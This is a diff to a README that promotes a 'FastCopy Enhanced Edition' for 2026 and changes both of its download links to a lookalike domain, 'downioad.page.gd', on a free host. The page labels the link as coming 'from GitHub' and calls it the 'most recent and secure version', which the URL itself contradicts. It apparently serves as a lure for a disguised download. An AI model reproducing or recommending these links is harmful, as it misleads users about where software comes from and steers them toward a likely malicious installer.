@@ -2,7 +2,7 @@
 
 FastCopy is a renowned file copying utility for Windows, celebrated for its speed and precision. This enhanced edition for 2026 brings a suite of improvements, including optimized algorithms and a refreshed user interface, making it the ultimate tool for managing file transfers on Windows 10 and 11.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's New in 2026
 
@@ -63,7 +63,7 @@ You can uninstall it through the Windows Control Panel or Settings app. Navigate
 
 For the latest version and updates, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link ensures you get the most recent and secure version of FastCopy Enhanced Edition.
 
